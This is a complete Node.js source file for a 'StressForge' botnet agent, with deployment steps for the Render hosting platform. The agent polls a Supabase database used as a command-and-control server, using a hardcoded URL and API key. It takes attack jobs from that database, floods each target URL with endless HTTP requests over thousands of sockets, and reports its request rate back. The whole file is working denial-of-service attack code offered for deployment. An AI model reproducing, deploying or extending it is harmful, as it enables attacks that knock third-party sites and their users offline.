/**
 * STRESSFORGE BOTNET AGENT (ZERO DEPENDENCY - RENDER READY)
 * 1. Create file: package.json (Use the copy button in App)
 * 2. Create file: index.js (Paste this code)
 * 3. Deploy. No npm install needed.
 */
const https = require('https');
const http = require('http');

// --- HARDCODED CONFIG ---
const SUPABASE_URL = "https://qbedywgbdwxaucimgiok.supabase.co";
const SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFiZWR5d2diZHd4YXVjaW1naW9rIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjQ3NDA5ODEsImV4cCI6MjA4MDMxNjk4MX0.Lz0x7iKy2UcQ3jdN4AdjSIYYISBfn233C9qT_8y8jFo";

// --- HEALTH CHECK SERVER (REQUIRED FOR RENDER) ---
const PORT = process.env.PORT || 3000;
http.createServer((req, res) => { res.writeHead(200); res.end('StressForge Agent Online'); })
    .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));

// --- NATIVE HTTPS HELPER ---
const supabaseRequest = (method, path, body = null) => {
    return new Promise((resolve, reject) => {
        const options = {
            hostname: SUPABASE_URL.replace('https://', '').replace('/', ''),
            path: `/rest/v1${path}`,
            method: method,
            headers: {
                'apikey': SUPABASE_KEY,
                'Authorization': `Bearer ${SUPABASE_KEY}`,
                'Content-Type': 'application/json',
                'Prefer': 'return=representation'
            }
        };
        const req = https.request(options, (res) => {
            let data = '';
            res.on('data', chunk => data += chunk);
            res.on('end', () => resolve(data ? JSON.parse(data) : null));
        });
        req.on('error', reject);
        if (body) req.write(JSON.stringify(body));
        req.end();
    });
};

console.log('\x1b[36m[AGENT] Zero-Dep Agent Initialized. Polling C2...\x1b[0m');

let activeJob = null;
let activeLoop = null;

// --- ATTACK LOGIC ---
const startAttack = (job) => {
    if (activeJob) return;
    activeJob = job;
    console.log(`\x1b[33m[ATTACK] Target: ${job.target} | Threads: ${job.concurrency}\x1b[0m`);
    
    let running = true;
    let totalRequests = 0;
    const startTime = Date.now();
    
    // High-performance Agent (Keep-Alive)
    const agent = new https.Agent({ keepAlive: true, maxSockets: 10000 });
    const targetUrl = new URL(job.target);
    const requestLib = targetUrl.protocol === 'https:' ? https : http;

    const flood = () => {
        if (!running) return;
        const req = requestLib.request(job.target, { agent, method: 'GET', headers: {'Cache-Control': 'no-cache'} }, (res) => {
            res.resume(); // Consume stream
            totalRequests++;
            flood(); // Infinite loop
        });
        req.on('error', () => { totalRequests++; flood(); });
        req.end();
    };

    // Spawn Threads
    for(let i=0; i<job.concurrency; i++) flood();

    // Report Loop
    activeLoop = setInterval(async () => {
        const elapsed = (Date.now() - startTime) / 1000;
        const rps = Math.floor(totalRequests / elapsed);
        
        // Heartbeat to C2
        try {
             await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { current_rps: rps });
        } catch(e) {}

        if (elapsed >= job.duration) {
            running = false;
            clearInterval(activeLoop);
            activeJob = null;
            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'COMPLETED', logs: 'Finished' });
            console.log('[COMPLETE] Attack finished. Waiting...');
        }
    }, 2000);
};

// --- POLL LOOP ---
setInterval(async () => {
    if (activeJob) return;
    try {
        // Fetch PENDING jobs
        const jobs = await supabaseRequest('GET', '/jobs?status=eq.PENDING&limit=1');
        if (jobs && jobs.length > 0) {
            const job = jobs[0];
            await supabaseRequest('PATCH', `/jobs?id=eq.${job.id}`, { status: 'RUNNING' });
            startAttack(job);
        }
    } catch (e) { console.log('Poll Error:', e.message); }
}, 3000);
